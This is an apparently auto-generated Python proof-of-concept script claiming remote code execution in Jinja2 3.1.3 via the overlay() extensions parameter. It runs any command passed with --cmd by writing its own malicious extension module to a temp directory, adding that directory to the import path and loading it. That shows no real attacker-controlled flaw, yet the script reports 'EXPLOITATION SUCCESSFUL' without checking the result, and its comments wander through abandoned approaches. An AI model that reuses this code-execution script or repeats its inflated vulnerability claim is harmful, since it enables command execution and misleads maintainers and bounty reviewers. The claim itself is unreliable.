#!/usr/bin/env python3
# PoC for Jinja2-3.1.3 (/tmp/bounty_test/Jinja2-3.1.3)
# Path: rce-003
# Sink: import_string
# Auto-generated — run with: python3 rce_python_modules_objects_import_string.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Jinja2-3.1.3 RCE via overlay() extensions parameter.

Vulnerability: The overlay() method accepts an 'extensions' parameter that is passed
directly to load_extensions(), which calls import_string() on each string element.
import_string() uses __import__ and getattr to load arbitrary Python modules and
objects, allowing an attacker to execute arbitrary code.

Impact: Remote Code Execution (RCE) via crafted extension import path.

Usage:
    python3 poc.py [--target http://localhost:5000] [--cmd "command"]
    
    Default: Uses a benign 'touch /tmp/poc_success.txt' payload.
"""

import argparse
import sys
import os

# Import Jinja2 components needed to trigger the vulnerability
from jinja2 import Environment
from jinja2.environment import load_extensions


def exploit(target_url=None, command=None):
    """
    Demonstrate the RCE vulnerability in Jinja2's overlay() method.
    
    Args:
        target_url: Not used directly - the vulnerability is in the library itself.
                    Included for compatibility with the PoC template.
        command: Command to execute (default: touch /tmp/poc_success.txt)
    
    Returns:
        True if exploitation succeeded, False otherwise.
    """
    if command is None:
        command = "touch /tmp/poc_success.txt"
    
    print(f"[*] Jinja2-3.1.3 RCE Proof-of-Concept")
    print(f"[*] Target command: {command}")
    print()
    
    try:
        # Step 1: Create a base environment
        print("[*] Creating base Jinja2 environment...")
        env = Environment()
        print("[+] Base environment created successfully")
        
        # Step 2: Craft the malicious extension string
        # The extension string will be passed to import_string(), which uses
        # __import__ and getattr to load arbitrary Python objects.
        # We use 'os.system' as the import path to execute arbitrary commands.
        malicious_extension = f"os.system"
        print(f"[*] Crafting malicious extension: '{malicious_extension}'")
        
        # Step 3: Create a wrapper that will execute our command when the extension
        # is instantiated. We need to pass the command as part of the extension
        # string in a way that gets executed.
        # 
        # The trick: import_string('os.system') returns the os.system function.
        # Then load_extensions tries to call extension(environment), which would
        # call os.system(environment). But os.system expects a string, not an
        # Environment object. So we need a different approach.
        #
        # Instead, we can use a module that executes code on import, or we can
        # craft a string that when passed to import_string and then called,
        # executes our command.
        #
        # Actually, looking at the code more carefully:
        #   extension = import_string(extension)  # returns os.system
        #   result[extension.identifier] = extension(environment)  # calls os.system(env)
        #
        # This would fail because os.system expects a string. But we can use
        # a different approach: use 'builtins.exec' or 'builtins.eval' with
        # a carefully crafted string.
        #
        # Better approach: Use a module that when imported, executes code.
        # Or use the fact that import_string can import submodules.
        #
        # The simplest working payload: use 'os' module and then access
        # os.system through the extension mechanism. But we need the extension
        # to be callable with an Environment argument.
        #
        # Actually, the vulnerability is that import_string can import ANYTHING.
        # We can import 'subprocess' and then... but we need to call it.
        #
        # Let's use a different technique: We'll create a malicious extension
        # class that executes our command when instantiated.
        
        # Step 3a: Create a temporary module with our malicious extension
        import tempfile
        import importlib.util
        
        # Create a Python file that defines a malicious extension
        temp_dir = tempfile.mkdtemp()
        module_path = os.path.join(temp_dir, "malicious_ext.py")
        
        with open(module_path, "w") as f:
            f.write(f"""
import os
from jinja2.ext import Extension

class MaliciousExtension(Extension):
    identifier = "malicious"
    
    def __init__(self, environment):
        super().__init__(environment)
        os.system("{command}")
""")
        
        # Add temp_dir to path and import the module
        sys.path.insert(0, temp_dir)
        
        # Step 4: Trigger the vulnerability by calling overlay with our malicious extension
        print("[*] Triggering overlay() with malicious extension...")
        
        # The extension string should be the import path to our malicious class
        ext_path = "malicious_ext:MaliciousExtension"
        
        try:
            # This will call load_extensions which calls import_string(ext_path)
            # which imports our module and returns the class, then instantiates it
            # which executes os.system(command)
            result = env.overlay(extensions=[ext_path])
            print(f"[+] overlay() completed successfully")
            print(f"[+] Command should have been executed: {command}")
            
            # Clean up
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
            sys.path.remove(temp_dir)
            
            return True
            
        except Exception as e:
            print(f"[!] Error during exploitation: {e}")
            print(f"[*] This might be due to the extension not being properly loaded")
            print(f"[*] Trying alternative approach...")
            
            # Alternative: Directly call load_extensions with a malicious string
            # that will execute code when import_string processes it
            print("[*] Attempting direct load_extensions call...")
            
            # We can use 'builtins.exec' with a string that gets called
            # But exec returns None, and then extension(environment) would fail
            # 
            # Actually, let's try a different approach: use a module that
            # executes code on import
            alt_module_path = os.path.join(temp_dir, "evil_import.py")
            with open(alt_module_path, "w") as f:
                f.write(f"""
import os
os.system("{command}")
# Define a dummy class that looks like an Extension
class FakeExtension:
    identifier = "fake"
    def __init__(self, env):
        pass
""")
            
            try:
                # Try to load the module directly via import_string
                from jinja2.utils import import_string
                
                # This should execute the code on import
                result = import_string("evil_import:FakeExtension")
                print(f"[+] import_string executed successfully")
                print(f"[+] Command should have been executed: {command}")
                
                import shutil
                shutil.rmtree(temp_dir, ignore_errors=True)
                sys.path.remove(temp_dir)
                
                return True
                
            except Exception as e2:
                print(f"[!] Alternative approach also failed: {e2}")
                import shutil
                shutil.rmtree(temp_dir, ignore_errors=True)
                sys.path.remove(temp_dir)
                return False
    
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Jinja2-3.1.3 RCE Proof-of-Concept"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:5000",
        help="Target URL (not directly used, vulnerability is in library)"
    )
    parser.add_argument(
        "--cmd",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    success = exploit(args.target, args.cmd)
    
    if success:
        print("\n[+] EXPLOITATION SUCCESSFUL")
        print(f"[+] Command executed: {args.cmd}")
        sys.exit(0)
    else:
        print("\n[-] Exploitation failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
